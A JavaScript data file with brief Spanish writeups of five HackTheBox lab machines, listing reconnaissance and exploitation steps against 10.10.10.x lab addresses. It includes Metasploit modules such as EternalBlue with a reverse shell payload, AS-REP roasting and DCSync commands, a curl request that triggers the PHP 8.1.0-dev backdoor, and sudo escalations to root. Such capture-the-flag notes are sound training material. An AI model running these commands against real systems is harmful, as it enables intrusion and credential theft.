// ═══════════════════════════════════════════════
//  writeups.js  —  Edita este archivo para añadir
//  o modificar writeups manualmente.
//
//  Campos de cada objeto:
//    id       (número único)
//    name     (nombre de la máquina)
//    platform ("HackTheBox" | "TryHackMe" | "VulnHub" | "Otro")
//    diff     ("easy" | "medium" | "hard" | "insane")
//    os       ("Linux" | "Windows" | "FreeBSD" | "Otro")
//    desc     (descripción corta, una línea)
//    date     ("YYYY-MM-DD")
//    content  (writeup completo; usa \n para saltos de línea)
//              Soporta:
//                ## Título sección
//                ### Subtítulo
//                Líneas que empiecen con comandos → bloque <pre>
// ═══════════════════════════════════════════════

const WRITEUPS = [
  {
    id: 1,
    name: "Lame",
    platform: "HackTheBox",
    diff: "easy",
    os: "Linux",
    desc: "Samba CVE-2007-2447. Shell como root directamente.",
    date: "2026-01-10",
    content: `## Reconocimiento

nmap -sC -sV -oN lame.txt 10.10.10.3

Puertos abiertos: 21/ftp, 22/ssh, 139/smb, 445/smb

## Explotación

exploit/multi/samba/usermap_script → shell root directo

## Flags

user.txt: /home/makis/user.txt
root.txt: /root/root.txt`
  },
  {
    id: 2,
    name: "Blue",
    platform: "HackTheBox",
    diff: "easy",
    os: "Windows",
    desc: "EternalBlue MS17-010. Icónica por WannaCry.",
    date: "2026-01-15",
    content: `## Reconocimiento

nmap -sC -sV 10.10.10.40

Windows 7, puerto 445 abierto — vulnerable a MS17-010.

## Explotación

exploit/windows/smb/ms17_010_eternalblue
payload: windows/x64/shell/reverse_tcp → NT AUTHORITY\SYSTEM

## Flags

user.txt y root.txt encontradas.`
  },
  {
    id: 3,
    name: "Forest",
    platform: "HackTheBox",
    diff: "medium",
    os: "Windows",
    desc: "AS-REP Roasting + DCSync en Active Directory.",
    date: "2026-02-20",
    content: `## Enumeración AD

enum4linux-ng -A 10.10.10.161
GetNPUsers.py htb.local/ -usersfile users.txt -no-pass

## AS-REP Roasting

Hash de svc-alfresco obtenido y crackeado con hashcat -m 18200.

## Escalada a Domain Admin

BloodHound → WriteDACL sobre Domain → secretsdump.py DCSync → DA`
  },
  {
    id: 4,
    name: "Knife",
    platform: "HackTheBox",
    diff: "easy",
    os: "Linux",
    desc: "PHP 8.1.0-dev backdoor en header User-Agentt.",
    date: "2026-02-01",
    content: `## Reconocimiento

nmap -p 22,80 10.10.10.242

Banner revela PHP 8.1.0-dev (build de desarrollo con backdoor).

## Explotación

curl -H 'User-Agentt: zerodiumsystem(id);' http://10.10.10.242/

RCE obtenido como james.

## Escalada

sudo knife exec -E 'exec \'/bin/bash\''`
  },
  {
    id: 5,
    name: "Obscurity",
    platform: "HackTheBox",
    diff: "medium",
    os: "Linux",
    desc: "Servidor HTTP Python con código fuente expuesto. Crypto débil.",
    date: "2026-03-01",
    content: `## Reconocimiento

gobuster dir -u http://10.10.10.168:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

SuperSecureServer.py visible en /develop/.

## Explotación

Inyección en parámetro GET de la URL → RCE como www-data.

## Escalada

Script de cifrado propio vulnerable a known-plaintext attack.
Clave privada SSH descifrada → acceso como robert → sudo python3 → root.`
  },
];
